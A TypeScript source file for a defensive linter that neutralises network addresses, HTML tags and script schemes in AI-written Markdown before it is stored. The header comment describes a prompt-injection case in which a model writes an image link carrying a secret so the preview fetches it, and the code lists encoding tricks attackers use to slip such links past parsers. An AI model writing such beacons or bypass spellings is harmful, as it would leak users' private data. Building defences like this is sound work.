/**
 * The pre-write linter for AI-touched Markdown (ADR 0019, §6).
 *
 * The rendering-beacon class: a model under prompt injection writes
 * `![](https://host/?d=<secret>)` into a proposal, the preview renders it, the
 * WebView fetches the image — and the secret has left the device without ever
 * passing the send overview, because the desktop CSP allows `img-src https:`.
 * Reference-style images, protocol-relative `//` URLs, HTML `<img>`,
 * `srcset` and CSS `url()` do the same; links leak on a click.
 *
 * The defence does not depend on parsing Markdown the way the renderer does.
 * A linter that tries to find "the images" and "the code spans" loses the
 * moment its parser and the renderer disagree (CommonMark gives HTML tags
 * precedence over code spans, code spans end at a blank line, a backtick in a
 * fence's info string makes it no fence …) — and an attacker only needs one
 * such disagreement. So every network destination the user has not allowed is
 * made inert WHEREVER it stands:
 *
 * - `https://host/…` becomes `https[://]host/…` — no parser, linkifier or
 *   browser treats that as a URL; the text stays readable;
 * - `www.host.tld` becomes `www[.]host.tld` (GFM would autolink it);
 * - a protocol-relative `//host/…` in a destination becomes `[//]host/…`;
 * - `javascript:`, `vbscript:`, `file:`, `blob:` and non-image `data:` in a
 *   destination lose their colon (`javascript[:]…`);
 * - an HTML tag that loads or links anything not allowed, and every
 *   `<script>`, `<iframe>`, `<svg>`, `<style>`, `<object>` … tag, is escaped to
 *   literal text (`&lt;img …`);
 * - an attribute that would load or link anything not allowed has its name
 *   bracketed (`[src]=…`) wherever it stands — also where the linter sees no
 *   whole tag around it: a browser reads a tag on past a `>` in a quoted value
 *   and past a `<`, and a part of a note may continue a tag the note opened.
 *   Neither a browser nor a Markdown parser reads `[src]` as that attribute.
 *
 * Each address is read the way the renderer reads it where it stands, whole
 * (strand 6, Nr. 12): a destination as CommonMark delimits it — blanks inside
 * `<…>`, balanced parentheses —, an attribute's value as a browser does — to
 * its quote, with tabs and line breaks dropped —, an address in running text
 * as GFM links it — after any character but a letter, to a blank or a `<`,
 * without the punctuation it trims —, spelled as written and as decoded.
 * Character references and backslash escapes are decoded, in an attribute and
 * in its CSS too, and an unsafe address is written back decoded and inert. An
 * address of the user's own (`known`) stays live only where it is read whole:
 * nothing can be hung onto it.
 *
 * Fenced code is no exception here: whether a fence is one depends on its place
 * in a note, which a part of a note does not show. A caller that lints a whole
 * note leaves out only the code every renderer shows as code
 * (`sureFencedCode`). Vault-relative links, wikilinks, `#anchors`, `mailto:`,
 * `tel:` and `data:image/…` stay as they are. The linter never throws, never
 * drops text, is idempotent, and reports every change as a finding for the
 * proposal card.
 */

export type LintFindingKind = "image" | "link" | "reference-definition" | "autolink" | "bare-url" | "html";

export interface LintFinding {
  kind: LintFindingKind;
  /** The destination as written. */
  url: string;
  /** Lower-case host for network URLs, the scheme for other schemes. */
  destination: string;
}

export interface LintOptions {
  /**
   * Hosts the user allowed for this write (for example the pages a research
   * run actually read). A host matches itself and its subdomains.
   */
  allowedHosts?: readonly string[];
  /**
   * Addresses the user's own text carries, as `addressesIn` reads them there.
   * One stays live where the linter reads exactly it — the whole destination,
   * the whole value, the whole address GFM links —, never where it only begins
   * something longer: allowing its host would let the model hang data onto a
   * host a note merely mentions.
   */
  known?: readonly string[];
}

export interface LintResult {
  text: string;
  findings: LintFinding[];
}

export type UrlVerdict = { safe: true } | { safe: false; destination: string };

const NETWORK_SCHEMES = new Set(["http", "https", "ftp", "ftps", "ws", "wss"]);
const HARMLESS_SCHEMES = new Set(["mailto", "tel"]);
const SAFE: UrlVerdict = { safe: true };
const NO_ADDRESSES: ReadonlySet<string> = new Set();

function hostAllowed(host: string, allowed: readonly string[]): boolean {
  const h = host.toLowerCase().replace(/\.$/, "");
  if (h === "") return false;
  return allowed.some((entry) => {
    const a = entry.trim().toLowerCase().replace(/^\*\./, "").replace(/\.$/, "");
    return a !== "" && (h === a || h.endsWith(`.${a}`));
  });
}

/** Already defused by this linter (or written inert on purpose). */
function inert(url: string): boolean {
  return /^[a-z][a-z0-9+.-]*\[:\/\/\]/i.test(url) || /^[a-z][a-z0-9+.-]*\[:\]/i.test(url) || /^\[[\\/]{2}\]/.test(url);
}

/**
 * The characters HTML names that are ASCII — all a scheme, its separator and a
 * host can be spelled with by name; every other name stands for a character
 * outside ASCII, which spells no scheme.
 */
const NAMED_ASCII: Readonly<Record<string, string>> = {
  Tab: "\t",
  NewLine: "\n",
  excl: "!",
  quot: '"',
  QUOT: '"',
  num: "#",
  dollar: "$",
  percnt: "%",
  amp: "&",
  AMP: "&",
  apos: "'",
  lpar: "(",
  rpar: ")",
  ast: "*",
  midast: "*",
  plus: "+",
  comma: ",",
  period: ".",
  sol: "/",
  colon: ":",
  semi: ";",
  lt: "<",
  LT: "<",
  equals: "=",
  gt: ">",
  GT: ">",
  quest: "?",
  commat: "@",
  lsqb: "[",
  lbrack: "[",
  bsol: "\\",
  rsqb: "]",
  rbrack: "]",
  Hat: "^",
  lowbar: "_",
  UnderBar: "_",
  grave: "`",
  DiacriticalGrave: "`",
  lcub: "{",
  lbrace: "{",
  verbar: "|",
  vert: "|",
  VerticalLine: "|",
  rcub: "}",
  rbrace: "}",
};

const codePoint = (value: number): string => (value > 0 && value <= 0x10ffff && (value < 0xd800 || value > 0xdfff) ? String.fromCodePoint(value) : String.fromCharCode(0xfffd));

/**
 * Character references decoded as a browser decodes them in an attribute and
 * CommonMark in a destination: numeric ones with or without their semicolon,
 * named ones that stand for ASCII. An unknown name stays as written — what it
 * spells is no scheme, and a host that holds it is no host anyone allowed.
 */
function decodeReferences(text: string): string {
  if (!text.includes("&")) return text;
  return text.replace(/&#[xX]([0-9a-fA-F]{1,6});?|&#([0-9]{1,7});?|&([A-Za-z][A-Za-z0-9]{1,31});/g, (whole, hex: string | undefined, dec: string | undefined, name: string | undefined) => {
    if (hex !== undefined) return codePoint(Number.parseInt(hex, 16));
    if (dec !== undefined) return codePoint(Number.parseInt(dec, 10));
    return NAMED_ASCII[name ?? ""] ?? whole;
  });
}

/** A destination as CommonMark reads it: its character references and backslash escapes decoded. */
function decodeDestination(dest: string): string {
  return decodeReferences(dest.replace(/\\([!-/:-@[-`{-~])/g, "$1"));
}

/** CSS escapes decoded: a backslash and up to six hex digits (one blank after them goes too), or a backslash and a character. */
function decodeCss(text: string): string {
  if (!text.includes("\\")) return text;
  return text.replace(/\\([0-9a-fA-F]{1,6})[ \t\n\r\f]?|\\([^\n\r\f0-9a-fA-F])/g, (_, hex: string | undefined, char: string | undefined) => (hex !== undefined ? codePoint(Number.parseInt(hex, 16)) : (char ?? "")));
}

/** What a style sheet in an attribute would load besides its `url(…)`: every string — `image-set("//host/x.png")` loads one. */
function cssStrings(css: string): string[] {
  const out: string[] = [];
  for (const m of css.matchAll(/"([^"]*)"|'([^']*)'/g)) out.push((m[1] ?? m[2] ?? "").trim());
  return out;
}

/** What HTML would read as markup or a reference, spelled out: a decoded address written back stays text. */
const asText = (text: string): string => text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

// GFM links "www." after any character but a letter or a digit — micromark's rule in running text and its rule
// for text it reads decoded, together —, followed by something a domain begins with.
// A "www." that begins a host. micromark (Plainva's own preview) links one only after a non-letter; markdown-it
// (Obsidian) and marked link one after a letter or digit too, and the note is read there as well — so a "www." is
// broken wherever a host follows it. Over-breaking the model's own text is no loss; the user's own addresses are kept
// by the `known` check that reads this same rule.
const WWW = /www\.(?=[\p{L}\p{N}_-])/giu;

/**
 * An unsafe destination written inert. A renderer forms a network authority at
 * an authority marker — `://` after any scheme, or a bare protocol-relative
 * `//` — so every one of those is broken WHEREVER it stands, not only at the
 * front: a reader that takes a URL from the middle of what we were handed (a
 * destination the linter read wider than the renderer, an address inside an
 * address) finds nothing live. A scheme that carries no `//` (`javascript:`,
 * `vbscript:`, `data:`, `file:` …) loses its colon; a `www.` GFM would link
 * once the rest is inert is broken too.
 */
function defuseDestination(dest: string): string {
  let out = dest.replace(/:\/\/|\/\//g, (m) => (m.length === 3 ? "[://]" : "[//]"));
  if (/^[a-z][a-z0-9+.-]*:/i.test(out)) out = out.replace(":", "[:]");
  return out.replace(WWW, "www[.]");
}

/** An address as a browser takes it from an attribute or a destination: tabs and line breaks dropped, C0 controls and blanks around it trimmed. */
function urlForm(url: string): string {
  const flat = url.replace(/[\t\n\r]/g, "");
  let from = 0;
  let to = flat.length;
  while (from < to && flat.charCodeAt(from) <= 0x20) from += 1;
  while (to > from && flat.charCodeAt(to - 1) <= 0x20) to -= 1;
  return flat.slice(from, to);
}

/** Decides one destination as it would be fetched or opened. An address in `known` is safe where it is the whole destination. */
export function classifyUrl(raw: string, allowedHosts: readonly string[] = [], known: ReadonlySet<string> = NO_ADDRESSES): UrlVerdict {
  if (known.size > 0 && known.has(urlForm(raw))) return SAFE;
  // A browser drops tab, line feed and carriage return from a URL before it reads the scheme, so `java&Tab;script:`
  // is `javascript:`. The linter reads it the same way.
  const url = raw.replace(/[\t\n\r]/g, "").trim().replace(/^<|>$/g, "").trim();
  if (url === "" || url.startsWith("#") || inert(url)) return SAFE;
  // Protocol-relative (and the backslash spellings browsers accept): the
  // renderer resolves them against https, i.e. the network.
  if (/^[\\/]{2}/.test(url)) {
    const host = url.replace(/^[\\/]+/, "").split(/[\\/?#]/)[0] ?? "";
    // An empty authority (`//`, `///…`) is the page's own origin, not a host anyone could beacon to.
    return host === "" || hostAllowed(host, allowedHosts) ? SAFE : { safe: false, destination: host.toLowerCase() };
  }
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(url)?.[1]?.toLowerCase();
  if (!scheme) return SAFE;
  if (HARMLESS_SCHEMES.has(scheme)) return SAFE;
  if (scheme === "data") {
    return /^data:image\/(?:png|jpe?g|gif|webp|avif|bmp)[;,]/i.test(url) ? SAFE : { safe: false, destination: "data" };
  }
  if (NETWORK_SCHEMES.has(scheme)) {
    let parsed: URL;
    try {
      parsed = new URL(url);
    } catch {
      return { safe: false, destination: scheme };
    }
    return hostAllowed(parsed.hostname, allowedHosts) ? SAFE : { safe: false, destination: parsed.hostname.toLowerCase() };
  }
  // javascript:, vbscript:, file:, blob: and every scheme Plainva does not know.
  return { safe: false, destination: scheme };
}

const HTML_TAG = /<\/?[a-z][a-z0-9:-]*(?:\s[^<>]*)?\/?>/gi;
const ALWAYS_ESCAPED_TAG = /^<\/?(?:script|style|iframe|frame|frameset|object|embed|applet|link|meta|base|form|svg|math|template|portal|noscript)\b/i;
const HTML_URL_ATTRIBUTE = /\b(?:src|href|srcset|poster|data|background|action|formaction|xlink:href|cite|longdesc|codebase|manifest|ping|lowsrc|dynsrc|imagesrcset)\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi;
const CSS_URL = /url\(([^)]*)\)/gi;
const STYLE_ATTRIBUTE = /\bstyle\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi;

/**
 * An attribute as a browser starts one: at the start of the text or behind a
 * blank, a "/" or a quote, a name, then "=". Found wherever it stands, not only
 * inside a tag the linter can see whole.
 */
const ATTRIBUTE = /(?<![^\t\n\f\r /"'])([^\t\n\f\r />"'=<][^\t\n\f\r />=]*)[\t\n\f\r ]*=/g;
/** The attributes whose value a browser loads or follows — SVG's animation values among them, which can set an `href`. */
const LOADING_ATTRIBUTES = new Set(["src", "href", "srcset", "poster", "data", "background", "action", "formaction", "xlink:href", "cite", "longdesc", "codebase", "manifest", "ping", "lowsrc", "dynsrc", "imagesrcset", "to", "from", "by", "values"]);

/** The address inside `url(…)`: blanks and one pair of quotes around it removed. */
function cssUrlValue(inner: string): string {
  const value = inner.trim();
  const quote = value[0];
  return (quote === '"' || quote === "'") && value.length > 1 && value.endsWith(quote) ? value.slice(1, -1) : value;
}

const isTagBlank = (c: string | undefined): boolean => c === " " || c === "\t" || c === "\n" || c === "\f" || c === "\r";

/** How far an unquoted value is read: a run without blanks can hold many attributes, each read to the run's end. */
const UNQUOTED_VALUE_MAX = 4096;

/**
 * An attribute's value as a browser reads it from just behind its "=": a quoted
 * one to its quote or the end of the text, an unquoted one to a blank or ">".
 * `whole` is false for an unquoted one longer than this linter reads.
 */
function attributeValue(text: string, at: number): { value: string; whole: boolean } {
  let i = at;
  while (isTagBlank(text[i])) i += 1;
  const quote = text[i];
  if (quote === '"' || quote === "'") {
    const close = text.indexOf(quote, i + 1);
    return { value: text.slice(i + 1, close < 0 ? text.length : close), whole: true };
  }
  const limit = Math.min(text.length, i + UNQUOTED_VALUE_MAX);
  let end = i;
  while (end < limit && !isTagBlank(text[end]) && text[end] !== ">") end += 1;
  return { value: text.slice(i, end), whole: end < limit || end === text.length };
}

/** The addresses an attribute's value holds: the entries of a list (`srcset`, `ping`, animation `values`), else the value. */
function attributeUrls(name: string, value: string): string[] {
  if (name === "srcset" || name === "imagesrcset") return value.split(",").map((part) => part.trim().split(/\s+/)[0] ?? "");
  if (name === "ping") return value.split(/\s+/);
  if (name === "values") return value.split(";");
  return [value];
}

/** What a tag the linter sees whole would load or follow. */
function tagCandidates(tag: string): string[] {
  const candidates: string[] = [];
  // Browsers decode character references in attributes before they read
  // the URL: `javascript&#58;`, `&#x2F;&#x2F;host` and `&#104;ttps` are real.
  const decoded = decodeReferences(tag);
  for (const m of decoded.matchAll(HTML_URL_ATTRIBUTE)) {
    const value = m[1]!.replace(/^["']|["']$/g, "").replace(/[\t\n\r]/g, "");
    // srcset carries a list: "a.png 1x, https://host/b.png 2x".
    for (const part of value.split(",")) candidates.push(part.trim().split(/\s+/)[0] ?? "");
  }
  // A style sheet decodes its own escapes: `u\72l(` is `url(`, and `image-set` loads its strings.
  const css = decodeCss(decoded);
  for (const m of css.matchAll(CSS_URL)) candidates.push(cssUrlValue(m[1]!));
  for (const m of css.matchAll(STYLE_ATTRIBUTE)) candidates.push(...cssStrings(m[1]!.replace(/^["']|["']$/g, "")));
  return candidates;
}

// Absolute network URLs, wherever they stand and whatever stands before them: micromark links one behind a digit
// or a letter outside ASCII, and other linkifiers are no stricter.
const SCHEME = /(?:https?|ftps?|wss?):\/\//gi;
// Destination positions where a protocol-relative URL or a scheme is fetched
// or opened: inline destinations, reference definitions — wherever their line
// starts (in a quote, a list item, indented) and with the destination on the
// next line —, autolinks. An autolink opens only on `<` followed by a scheme
// CommonMark would accept (two to thirty-two characters, then a colon): `<x:`
// in an image's or a link's text is no autolink, and reading one there would
// swallow the real destination behind it. Taking more for a definition than
// CommonMark does only makes one more address inert.
const DESTINATION_LEAD = /\]\(\s*|\]:[ \t]*(?:\r?\n[ \t>]*)?|<(?=[A-Za-z][A-Za-z0-9+.-]{1,31}:)/g;

function contextKind(before: string): LintFindingKind {
  if (/!\[[^\]]*\]\(\s*<?$/.test(before)) return "image";
  if (/\]\(\s*<?$/.test(before)) return "link";
  if (/\]:[ \t]*(?:\r?\n[ \t>]*)?<?$/.test(before)) return "reference-definition";
  if (/<$/.test(before)) return "autolink";
  return "bare-url";
}

// A destination is read no further than this. A host sits at its front, so a longer scan finds no new host; the cap
// keeps a run of pasted-together `](`/`]:`/`<` leads from each scanning to the end of the text — the whole would be
// quadratic. Past it, the address's `://` is still broken; only how far the finding quotes it is capped.
const MAX_ADDRESS = 4096;

/**
 * Where a destination that starts at `at` ends, as CommonMark delimits it: one
 * in `<…>` at its ">" (blanks are part of it), one without at a blank or a
 * control character, with balanced parentheses and backslash escapes; an
 * autolink (behind a lone "<") at its ">". Returns where the destination's
 * text starts and ends, the angle brackets left out.
 */
function destinationAt(text: string, at: number, autolink: boolean): { from: number; to: number } {
  const limit = Math.min(text.length, at + MAX_ADDRESS);
  if (autolink) {
    let end = at;
    while (end < limit && text[end] !== ">" && text[end] !== "<" && text[end] !== "]" && text.charCodeAt(end) > 0x20) end += 1;
    // A real autolink ends at `>`. A `]` stops it short: a link's or an image's own `](…)` destination follows, and
    // it must be read on its own, not swallowed — but the scheme up to the `]` is still defused, so the renderer does
    // not read `<ab:](…)>` as one autolink to the attacker. A space, a control character, a `<` or the end means
    // there is no autolink: the `<` is literal, and any scheme is caught in running text (step 4).
    return text[end] === ">" || text[end] === "]" ? { from: at, to: end } : { from: at, to: at };
  }
  if (text[at] === "<") {
    let end = at + 1;
    while (end < limit && text[end] !== ">" && text[end] !== "<" && text[end] !== "\n") end += text[end] === "\\" ? 2 : 1;
    return { from: at + 1, to: Math.min(end, text.length) };
  }
  let end = at;
  let depth = 0;
  while (end < limit) {
    const code = text.charCodeAt(end);
    if (code <= 0x20 || code === 0x7f) break;
    const c = text[end];
    if (c === "\\") {
      end += 2;
      continue;
    }
    if (c === "(") depth += 1;
    else if (c === ")") {
      if (depth === 0) break;
      depth -= 1;
    }
    end += 1;
  }
  return { from: at, to: Math.min(end, text.length) };
}

const TRIMMED_BY_GFM = new Set(["?", "!", ".", ",", ":", "*", "_", "~"]);
const isBlank = (c: string): boolean => /\s/.test(c);

/**
 * Where GFM ends an address it links in running text, from its first character:
 * at a blank or a "<", less the punctuation it trims off the end — trailing
 * `?!.,:*_~`, a ")" without its "(", and what looks like a character reference.
 */
function gfmEnd(text: string, start: number): number {
  const limit = Math.min(text.length, start + MAX_ADDRESS);
  let end = start;
  let open = 0;
  let close = 0;
  while (end < limit && !isBlank(text[end]!) && text[end] !== "<") {
    if (text[end] === "(") open += 1;
    else if (text[end] === ")") close += 1;
    end += 1;
  }
  for (;;) {
    const last = text[end - 1];
    if (end <= start || last === undefined) return end;
    if (TRIMMED_BY_GFM.has(last)) {
      end -= 1;
      continue;
    }
    if (last === ")" && close > open) {
      end -= 1;
      close -= 1;
      continue;
    }
    if (last === ";") {
      // A reference's name has no parentheses: the counts stay as they are.
      const reference = /&[A-Za-z0-9]+;$/.exec(text.slice(Math.max(start, end - 40), end));
      if (reference) {
        end -= reference[0].length;
        continue;
      }
    }
    return end;
  }
}

/**
 * The text as a renderer reads its characters — character references and
 * backslash escapes decoded —, with, for each character, the stretch of the
 * text it was read from.
 */
function readable(text: string): { view: string; from: number[]; to: number[] } {
  const view: string[] = [];
  const from: number[] = [];
  const to: number[] = [];
  const keep = (start: number, end: number) => {
    for (let i = start; i < end; i++) {
      view.push(text[i]!);
      from.push(i);
      to.push(i + 1);
    }
  };
  let last = 0;
  for (const m of text.matchAll(/&#[xX][0-9a-fA-F]{1,6};?|&#[0-9]{1,7};?|&[A-Za-z][A-Za-z0-9]{1,31};|\\[!-/:-@[-`{-~]/g)) {
    const at = m.index;
    const token = m[0];
    keep(last, at);
    const decoded = token[0] === "\\" ? token.slice(1) : decodeReferences(token);
    if (decoded === token) keep(at, at + token.length);
    else {
      for (const unit of decoded.split("")) {
        view.push(unit);
        from.push(at);
        to.push(at + token.length);
      }
    }
    last = at + token.length;
  }
  keep(last, text.length);
  return { view: view.join(""), from, to };
}

interface Edit {
  from: number;
  to: number;
  text: string;
  finding: LintFinding | null;
}

/** The edits applied in order; one that starts inside the stretch an earlier one replaced is left out, finding and all. */
function applyEdits(text: string, edits: Edit[], findings: LintFinding[]): string {
  edits.sort((a, b) => a.from - b.from || b.to - a.to);
  let out = "";
  let last = 0;
  for (const edit of edits) {
    if (edit.from < last) continue;
    out += text.slice(last, edit.from) + edit.text;
    last = edit.to;
    if (edit.finding) findings.push(edit.finding);
  }
  return out + text.slice(last);
}

/** How the steps judge what they read: a destination, and a "www." address GFM would link. */
interface Judge {
  url(url: string): UrlVerdict;
  /** Whether a "www." address stays live. */
  www(address: string, host: string): boolean;
}

/** Step 1: an HTML tag that loads or links anything not allowed becomes literal text — escaping its "<" is enough. */
function lintTags(text: string, judge: Judge, findings: LintFinding[]): string {
  let out = "";
  let last = 0;
  for (const m of text.matchAll(HTML_TAG)) {
    const tag = m[0];
    const always = ALWAYS_ESCAPED_TAG.test(tag);
    let unsafe: UrlVerdict | null = null;
    let url = "";
    if (!always) {
      for (const candidate of tagCandidates(tag)) {
        const verdict = judge.url(candidate);
        if (!verdict.safe) {
          unsafe = verdict;
          url = candidate;
          break;
        }
      }
    }
    if (!always && !unsafe) continue;
    findings.push({ kind: "html", url: url || tag.slice(1).split(/[\s>/]/)[0] || "", destination: unsafe && !unsafe.safe ? unsafe.destination : "html" });
    out += `${text.slice(last, m.index)}&lt;${tag.slice(1)}`;
    last = m.index + tag.length;
  }
  return out + text.slice(last);
}

/**
 * Step 2: an attribute that would load or link anything not allowed has its
 * name bracketed, wherever it stands — in a tag step 1 made text too, which a
 * later pass no longer sees as one. Its value is read as a browser reads it —
 * to its quote, past a ">" and a "<", across lines —: a list's every entry,
 * and the `url(…)` of a style sheet in any attribute (an SVG `fill` takes
 * one), a style's strings too.
 */
function lintAttributes(text: string, judge: Judge): Edit[] {
  const edits: Edit[] = [];
  for (const m of text.matchAll(ATTRIBUTE)) {
    const at = m.index;
    const name = m[1]!;
    if (name.startsWith("[")) continue;
    const lower = name.toLowerCase();
    const read = attributeValue(text, at + m[0].length);
    const loading = LOADING_ATTRIBUTES.has(lower);
    if (!read.whole && (loading || lower === "style")) {
      // Longer than this linter reads: what it loads may stand further on.
      edits.push({ from: at, to: at + name.length, text: `[${name}]`, finding: { kind: "html", url: read.value.slice(0, 80), destination: "html" } });
      continue;
    }
    const value = decodeReferences(read.value);
    const urls = loading ? attributeUrls(lower, value) : [];
    const css = decodeCss(value);
    if (lower === "style" || /url\(/i.test(css)) {
      for (const u of css.matchAll(CSS_URL)) urls.push(cssUrlValue(u[1]!));
      if (lower === "style") urls.push(...cssStrings(css));
    }
    for (const url of urls) {
      const verdict = judge.url(url.replace(/[\t\n\r]/g, ""));
      if (verdict.safe) continue;
      edits.push({ from: at, to: at + name.length, text: `[${name}]`, finding: { kind: "html", url, destination: verdict.destination } });
      break;
    }
  }
  return edits;
}

/**
 * Step 3: destinations — inline ones, reference definitions, autolinks —, each
 * read whole as CommonMark delimits it and decoded. An unsafe one is written
 * back inert, decoded where it was spelled with references or escapes, with
 * what HTML would read as markup or a reference spelled out again.
 */
function lintDestinations(text: string, judge: Judge): Edit[] {
  const edits: Edit[] = [];
  for (const m of text.matchAll(DESTINATION_LEAD)) {
    const lead = m[0];
    const autolink = lead === "<";
    const { from, to } = destinationAt(text, m.index + lead.length, autolink);
    const dest = text.slice(from, to);
    // Tab, line feed and carriage return a reference brought into the destination go, as a browser drops them before
    // it reads the scheme: `java&Tab;script:` becomes `javascript:`, written back inert as that.
    const decoded = decodeDestination(dest).replace(/[\t\n\r]/g, "");
    if (decoded === "") continue;
    const verdict = judge.url(decoded);
    if (verdict.safe) continue;
    const before = text.slice(Math.max(0, m.index - 400), from);
    edits.push({ from, to, text: decoded === dest ? defuseDestination(dest) : asText(defuseDestination(decoded)), finding: { kind: contextKind(before), url: dest, destination: verdict.destination } });
  }
  return edits;
}

/**
 * Step 4: addresses in running text, wherever they stand — also inside a
 * destination or an attribute, where a renderer that does not see the one may
 * still see the other. Each scheme and each "www." is judged on its own, as GFM
 * links it from there: spelled as written (micromark links what it finds raw)
 * and as decoded (and what it reads decoded): an address inside an address is
 * one of its own once the outer one is inert.
 */
function lintRunningText(text: string, judge: Judge): Edit[] {
  const edits: Edit[] = [];
  const { view, from, to } = readable(text);
  const readings = (v: number, length: number): { view: string; raw: string | null; start: number; end: number; asWritten: boolean } => {
    const start = from[v]!;
    const end = to[v + length - 1]!;
    const asWritten = text.slice(start, end) === view.slice(v, v + length);
    return { view: view.slice(v, gfmEnd(view, v)), raw: asWritten ? text.slice(start, gfmEnd(text, start)) : null, start, end, asWritten };
  };
  for (const m of view.matchAll(SCHEME)) {
    const reading = readings(m.index, m[0].length);
    let verdict = judge.url(reading.view);
    if (verdict.safe && reading.raw !== null) verdict = judge.url(reading.raw);
    if (verdict.safe) continue;
    const scheme = m[0].slice(0, -3);
    const finding: LintFinding = { kind: contextKind(text.slice(Math.max(0, reading.start - 400), reading.start)), url: reading.view, destination: verdict.destination };
    edits.push(reading.asWritten ? { from: reading.start + scheme.length, to: reading.end, text: "[://]", finding } : { from: reading.start, to: reading.end, text: `${asText(scheme)}[://]`, finding });
  }
  for (const m of view.matchAll(WWW)) {
    const reading = readings(m.index, 4);
    const host = /^www\.[^\s/?#<>()"'`]+/i.exec(reading.view)?.[0] ?? "";
    // A "www." address has no scheme that could make it harmless: it is live unless its host is allowed or it is one
    // of the user's own, whole.
    if (judge.www(reading.view, host) && (reading.raw === null || judge.www(reading.raw, host))) continue;
    edits.push({ from: reading.start, to: reading.end, text: "www[.]", finding: { kind: "bare-url", url: host, destination: host.toLowerCase() } });
  }
  return edits;
}

/** The linter's four steps, each on the text the step before left, every address judged by `judge`. */
function lintWith(markdown: string, judge: Judge, findings: LintFinding[]): string {
  // NUL never belongs in Markdown (and turns a file binary for git).
  const input = markdown.split(String.fromCharCode(0)).join("");
  const tags = lintTags(input, judge, findings);
  const named = applyEdits(tags, lintAttributes(tags, judge), findings);
  return applyEdits(named, [...lintDestinations(named, judge), ...lintRunningText(named, judge)], findings);
}

/**
 * Lints AI-proposed Markdown before it is stored.
 */
export function preWriteLint(markdown: string, options: LintOptions = {}): LintResult {
  const allowed = options.allowedHosts ?? [];
  const known = options.known && options.known.length > 0 ? new Set(options.known) : NO_ADDRESSES;
  const findings: LintFinding[] = [];
  const judge: Judge = {
    url: (url) => classifyUrl(url, allowed, known),
    www: (address, host) => hostAllowed(host, allowed) || known.has(urlForm(address)),
  };
  return { text: lintWith(markdown, judge, findings), findings };
}

/**
 * Every address a text carries, each as the linter reads it where it stands —
 * a destination whole, an attribute's value whole, an address in running text
 * as GFM links it, as written and as decoded. What `known` takes: the addresses
 * of the user's own text, which a write may carry on as they are.
 */
export function addressesIn(text: string): string[] {
  const found = new Set<string>();
  const judge: Judge = {
    url: (url) => {
      const form = urlForm(url);
      if (form) found.add(form);
      return SAFE;
    },
    www: (address) => {
      const form = urlForm(address);
      if (form) found.add(form);
      return true;
    },
  };
  lintWith(text, judge, []);
  return [...found];
}
